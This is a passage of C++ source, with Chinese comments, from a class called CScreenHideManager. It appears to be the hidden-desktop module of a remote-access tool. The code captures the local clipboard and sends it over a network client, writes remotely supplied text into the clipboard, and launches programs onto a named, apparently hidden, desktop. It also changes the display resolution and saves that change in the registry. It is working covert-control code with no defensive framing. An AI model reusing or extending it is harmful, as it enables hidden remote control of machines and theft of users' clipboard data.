		PostMessage(hWnd, m_MYtagMSG->message,(WPARAM)m_MYtagMSG->wParam, m_MYtagMSG->lParam);
	}
}


void CScreenHideManager::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenHideManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = int(GlobalSize(hglb)) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT_HIDE;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


// 屏幕分辨率是否发生改变
bool CScreenHideManager::IsMetricsChange()
{
	if ((m_oldwidth != ::GetSystemMetrics(SM_CXVIRTUALSCREEN)) || (m_oldheigh != ::GetSystemMetrics(SM_CYVIRTUALSCREEN)))
	{
		if (m_oldwidth == 0 || m_oldheigh == 0)
		{
			return false;
		}
		m_oldwidth = ::GetSystemMetrics(SM_CXVIRTUALSCREEN);
		m_oldheigh = ::GetSystemMetrics(SM_CYVIRTUALSCREEN);
		return true;
	}

	return false;
}

bool CScreenHideManager::IsConnect()
{
	return (m_pClient->IsRunning()) ? true : false;
}

int CScreenHideManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}

void CScreenHideManager::Loop_Screen()
{
	//获取分辨率  
	int _cx = ::GetSystemMetrics(SM_CXSCREEN);
	int _cy = ::GetSystemMetrics(SM_CYSCREEN);

	//修改分辨率  
	DEVMODE lpDevMode;
	lpDevMode.dmBitsPerPel = 32;//每个像素的位数  
	lpDevMode.dmPelsWidth = 1600;//屏幕宽度（像素）  
	lpDevMode.dmPelsHeight = 900;//屏幕高度（像素）  
	lpDevMode.dmSize = sizeof(lpDevMode);
	lpDevMode.dmFields =
		DM_PELSWIDTH/*使用dmPelsWidth的值*/
		| DM_PELSHEIGHT/*使用dmPelsHeight的值*/
		| DM_BITSPERPEL/*使用dmBitsPerPel的值*/;
	//  
	LONG result = ChangeDisplaySettings(&lpDevMode, 0);
	if (result == DISP_CHANGE_SUCCESSFUL)
	{
		//			MessageBox(NULL, L"修改成功！", L"Tip", MB_OK);  
		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRY表示次修改是持久的，并在注册表中写入了相关的数据  
	}
	else
	{
		//			MessageBox(NULL, L"修改失败，恢复原有设置！", L"Tip", MB_OK);  
		ChangeDisplaySettings(NULL, 0);
	}
	//	return 0;
}



bool CScreenHideManager::LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
{
	bool bReturn = false;

	try
	{
		if (!pszApplicationFilePath || !pszDesktopName || !_tcslen(pszApplicationFilePath) || !_tcslen(pszDesktopName))
			throw _T("Invalid Argument.");

		TCHAR szDirectoryName[MAX_PATH*2] = { 0 };
		TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };

		_tcscpy_s(szDirectoryName, _tcslen(pszApplicationFilePath) + 1, pszApplicationFilePath);

		if (!PathIsExe(pszApplicationFilePath))
			throw _T("Invalid File Extension");
		//AfxMessageBox(szDirectoryName);
		PathRemoveFileSpec(szDirectoryName);
		//AfxMessageBox(szDirectoryName);
		STARTUPINFO sInfo = { 0 };
		PROCESS_INFORMATION pInfo = { 0 };

		sInfo.cb = sizeof(sInfo);
		sInfo.lpDesktop = pszDesktopName;

		//Lanuching a application into dekstop

		BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
			NULL,
			NULL,
			NULL,
			TRUE,
			NORMAL_PRIORITY_CLASS,
			NULL,
			szDirectoryName,
			&sInfo,
			&pInfo);

		TCHAR* pszError = NULL;
		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, GetLastError(), 0, (LPWSTR)&pszError, 0, NULL);
		OutputDebugString(_T("\n\t\t"));
		OutputDebugString(pszError);

		if (bCreateProcessReturn)
			bReturn = true;

	}
	catch (...)
	{
		bReturn = false;
	}

	return bReturn;
}
